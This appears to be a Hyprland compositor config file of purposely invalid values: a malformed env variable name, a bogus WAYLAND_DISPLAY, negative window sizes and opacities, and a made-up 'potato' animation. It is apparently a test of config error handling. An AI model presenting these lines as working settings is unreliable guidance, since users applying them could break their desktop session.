plugin {
    hyprscrolling {
        column_width = 100
        scroll_speed = 0
    }
}

misc {
    disable_hyprland_logo = no
    force_default_wallpaper = 999
    vfr = yes
}

env = THIS_IS_NOT_A_VALID_VARIABLE!!!, 123456
env = SDL_VIDEODRIVER, 
env = WAYLAND_DISPLAY, this_is_not_wayland

windowrule = fullscreen, ^.*$
windowrule = float, ^.*$
windowrule = size -100 -100, .*
windowrule = opacity -1 -1, .*
windowrule = animation potato, .*

layerrule = blur, *
layerrule = ignorealpha -1, *

